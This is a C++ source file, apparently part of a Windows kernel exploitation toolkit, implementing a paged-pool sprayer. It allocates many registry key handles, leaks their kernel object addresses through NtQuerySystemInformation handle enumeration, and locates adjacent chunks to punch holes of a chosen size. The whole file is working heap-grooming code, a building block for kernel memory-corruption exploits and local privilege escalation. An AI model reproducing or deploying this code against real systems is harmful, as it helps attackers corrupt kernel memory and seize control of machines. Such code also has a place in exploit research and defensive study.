#include "stdafx.h"
#include "PoolSprayer.h"

#define KEY_SIZE 0x100
#define WEIRD_OFFSET_FOR_KEY 0x70

HANDLE defaultPagedPoolAllocator()
{
	HKEY key;

	long n = RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("SOFTWARE"), 0, KEY_QUERY_VALUE, &key);
	if (n == ERROR_SUCCESS) {
		return (HANDLE)key;
	}
	throw PoolSprayerException("[-]Failed to allocate Key object !\n");
}

PagedPoolSprayer::PagedPoolSprayer()
{
	Init(KEY_SIZE, DEFAULT_MAX_OBJECTS, &defaultPagedPoolAllocator, WEIRD_OFFSET_FOR_KEY);
}

PagedPoolSprayer::PagedPoolSprayer(UINT nObjectSize, UINT nMaxObject, Allocator_t pAllocator, UINT SomeWeirdOffset) : PoolSprayer(nObjectSize, nMaxObject, pAllocator, SomeWeirdOffset)
{

}

PagedPoolSprayer::~PagedPoolSprayer()
{
	if (m_hObjectTable != NULL)
		freePool();
}

HOLE PagedPoolSprayer::planHole(UINT nHoleSize)
{
	UINT i = 0;
	NTSTATUS st;
	PSYSTEM_EXTENDED_HANDLE_INFORMATION handleInfo;
	ULONG handleInfoLen = 0x10000;
	bool IsChunkCorrect = true;
	INT  handleIndex = 0;
	INT	*indexToClose;
	HOLE hole;
	DWORD pid = GetCurrentProcessId();

	if (nHoleSize == 0)
	{
		throw PoolSprayerException("[-]Hole size is 0 !\n");
	}
	else if (nHoleSize * m_nSingleObjectSize >= 0xFF0)
	{
		throw PoolSprayerException("[-]The hole you're trying to create is too big because it's larger than a page !\n");
	}
	else if (nHoleSize * m_nSingleObjectSize <= 0x200)
	{
		printf("[!]The size of the hole you want to create is <= 0x200 ! Your spraying might not work because of the LookAsideList !\n");
	}

	handleInfo = (PSYSTEM_EXTENDED_HANDLE_INFORMATION)malloc(handleInfoLen);

	hole.nHoleSize = nHoleSize;
	hole.pHandlesToClose = new HANDLE[hole.nHoleSize + 1];
	indexToClose = new INT[hole.nHoleSize + 1];

	while ((st = m_pNtQuerySystemInformation(
		SystemExtendedHandleInformation,
		handleInfo,
		handleInfoLen,
		NULL
	)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_EXTENDED_HANDLE_INFORMATION)realloc(handleInfo, handleInfoLen *= 2);

	if (!NT_SUCCESS(st)) {
		throw PoolSprayerException("[-]NtQuerySystemInformation failed !");
	}

	for (i = m_nStartIndex; i < m_nMaxObjects - 100; i++)
	{
		for (UINT j = 0; j < handleInfo->NumberOfHandles; j++)
		{
			IsChunkCorrect = true;
			if (pid != handleInfo->Handles[j].UniqueProcessId || handleInfo->Handles[j].HandleValue != m_hObjectTable[i])
				IsChunkCorrect = false;
			else
			{
				DWORD64 pTmpBaseAddress = (DWORD64)handleInfo->Handles[j].Object - m_nSomeWeirdOffset;
				
				/* DEBUG
				printf("Trying with Base address 0x%llX\n", pTmpBaseAddress);
				for (INT m = 1; m < 11; m++)
				{
					printf("The handle 0x%p is at address 0x%llX\n", m_hObjectTable[i + m], getObjectAddressWithHandle(m_hObjectTable[i + m], 50) - m_nSomeWeirdOffset);
				}
				*/
				for (INT k = -1; k <= (INT)nHoleSize; k++)
				{
					DWORD64 tmpAddress = pTmpBaseAddress + ((INT)m_nSingleObjectSize * k);
					HANDLE tmp = INVALID_HANDLE_VALUE;


					if (!(tmpAddress & 0xFFF) || (tmp = getObjectHandleWithAddress(tmpAddress + m_nSomeWeirdOffset)) == INVALID_HANDLE_VALUE)
					{
						//printf("failed with tmp equals 0x%p at address 0x%llX\n", tmp, tmpAddress);
						IsChunkCorrect = false;
						break;
					}
					else if (k >= 0 && k < (INT)nHoleSize)
					{
						//printf("Got handle 0x%p at address 0x%llX\n", tmp, tmpAddress);
						hole.pHandlesToClose[k] = tmp;
					}
				}
			}
			if (IsChunkCorrect)
			{
				//remove from m_hObjectTable 
				BOOL failed = FALSE;

				for (UINT k = 0; k < nHoleSize; k++)
				{
					try
					{
						handleIndex = findHandleIndex(hole.pHandlesToClose[k], m_hObjectTable, m_nMaxObjects);
					}
					catch (PoolSprayerException &e)
					{
						e;
						failed = TRUE;
						break;
					}
					indexToClose[k] = handleIndex;
				}
				if (failed)
					continue;

				hole.pBaseAddress = (PVOID)((DWORD64)(handleInfo->Handles[j].Object) - m_nSomeWeirdOffset);
				hole.nBaseIndexInOriginalSpray = indexToClose[0];
				for (UINT k = 0; k < nHoleSize; k++)
				{
					m_hObjectTable[indexToClose[k]] = INVALID_HANDLE_VALUE;
				}
				
				m_nStartIndex = i + 1 + hole.nHoleSize;
				free(handleInfo);
				return (hole);
			}
		}
	}
	free(handleInfo);
	throw PoolSprayerException("[-]Didn't find any valid chunk... Maybe the size of your object or the weird offset is not correct ?\n");
}